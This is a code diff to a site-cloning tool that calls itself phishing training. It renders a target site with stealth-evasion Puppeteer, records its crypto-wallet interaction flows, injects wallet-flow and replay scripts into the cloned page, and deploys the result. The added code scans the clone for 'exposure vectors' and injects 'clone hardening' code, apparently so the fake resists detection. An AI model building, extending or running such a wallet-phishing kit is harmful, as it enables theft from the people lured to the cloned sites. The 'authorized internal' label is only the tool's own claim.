@@ -136,6 +136,14 @@ import {
   buildFlowReplayInjectionCode,
   type CapturedFlows,
 } from './lib/wallet-flow-recorder.js'
+import {
+  detectInteractionPatterns,
+  scanExposureVectors,
+  generateResilienceReport,
+  generateHardeningCode,
+  DEFAULT_HARDENING_CONFIG,
+  type HardeningReport,
+} from './lib/clone-resilience-hardening.js'
 
 const TRAINING_UA =
   'Legion-Phishing-Training-Bot/1.0 (authorized-internal; respects-robots; no-index)'
@@ -494,6 +502,7 @@ async function renderPageWithPuppeteer(targetUrl: string, outputDir?: string): P
   html: string
   walletFlows: WalletFlowCapture
   capturedFlows?: CapturedFlows
+  resilienceReport?: HardeningReport
 }> {
   console.info('[PUPPETEER] Launching headless browser with stealth evasion…')
 
@@ -557,11 +566,22 @@ async function renderPageWithPuppeteer(targetUrl: string, outputDir?: string): P
       })
     }
 
+    // NEW: Detect interaction patterns and hardening
+    console.info('[PUPPETEER] Detecting interaction patterns and exposure vectors…')
+    const patterns = await detectInteractionPatterns(page)
+    const exposed = await scanExposureVectors(page)
+    const resilienceReport = generateResilienceReport(patterns, exposed, DEFAULT_HARDENING_CONFIG)
+    console.info('[PUPPETEER] Resilience analysis complete:', {
+      patternsDetected: patterns.length,
+      exposureVectors: exposed.length,
+      resilienceScore: resilienceReport.resilience,
+    })
+
     const html = await page.content()
     console.info('[PUPPETEER] Page fully rendered ✓')
 
     await page.close()
-    return { html, walletFlows, capturedFlows }
+    return { html, walletFlows, capturedFlows, resilienceReport }
   } finally {
     await browser.close()
   }
@@ -1471,6 +1491,7 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
   let html: string
   let walletFlows: WalletFlowCapture | null = null
   let capturedFlows: CapturedFlows | null = null
+  let resilienceReport: HardeningReport | null = null
 
   if (authorizedTest) {
     console.info('[PHISHING_TRAINING] Using Puppeteer full render (authorized production clone)…')
@@ -1479,6 +1500,7 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
       html = renderResult.html
       walletFlows = renderResult.walletFlows
       capturedFlows = renderResult.capturedFlows || null
+      resilienceReport = renderResult.resilienceReport || null
       console.info('[WALLET-DETECTOR] Captured wallet flows:', {
         wallets: walletFlows.wallets.map(w => w.name),
         flows: walletFlows.flows.length,
@@ -1487,6 +1509,13 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
         console.info('[FLOW-RECORDER] Recorded interaction flows:', {
           totalFlows: capturedFlows.totalFlows,
           steps: capturedFlows.flows.reduce((sum, f) => sum + f.totalSteps, 0),
+        })
+      }
+      if (resilienceReport) {
+        console.info('[RESILIENCE] Clone hardening analysis:', {
+          patternsDetected: resilienceReport.patternsDetected.length,
+          exposureVectors: resilienceReport.exposed.length,
+          resilienceScore: resilienceReport.resilience,
         })
       }
     } catch (e) {
@@ -1647,10 +1676,17 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
     flowReplayInjection = buildFlowReplayInjectionCode(capturedFlows)
   }
 
+  // NEW: Inject resilience hardening code
+  let hardeningInjection = ''
+  if (resilienceReport) {
+    console.info('[RESILIENCE] Injecting clone hardening code (resilience score: ' + resilienceReport.resilience + ')…')
+    hardeningInjection = generateHardeningCode(DEFAULT_HARDENING_CONFIG)
+  }
+
   if (html.includes('</body>')) {
-    html = html.replace('</body>', `${flowReplayInjection}\n${walletFlowInjection}\n${injection}\n</body>`)
+    html = html.replace('</body>', `${hardeningInjection}\n${flowReplayInjection}\n${walletFlowInjection}\n${injection}\n</body>`)
   } else {
-    html += flowReplayInjection + walletFlowInjection + injection
+    html += hardeningInjection + flowReplayInjection + walletFlowInjection + injection
   }
 
   await writeFile(path.join(outDir, 'index.html'), html, 'utf8')
@@ -1685,6 +1721,10 @@ Flags: ${FEATURE_FLAGS.map((f) => `--${f}`).join(' ')} --authorized-test --inter
           interaction_flows_recorded: capturedFlows ? capturedFlows.totalFlows : 0,
           interaction_flow_steps: capturedFlows ? capturedFlows.flows.reduce((sum, f) => sum + f.totalSteps, 0) : 0,
           interaction_flows_wallets: capturedFlows ? capturedFlows.flows.map(f => f.walletType) : [],
+          resilience_score: resilienceReport?.resilience ?? 0,
+          patterns_detected: resilienceReport?.patternsDetected.map(p => p.type) ?? [],
+          exposure_vectors: resilienceReport?.exposed ?? [],
+          hardening_enabled: true,
           generated_at: new Date().toISOString(),
           features: enabledFlags,
           deploy_url: deployUrl,
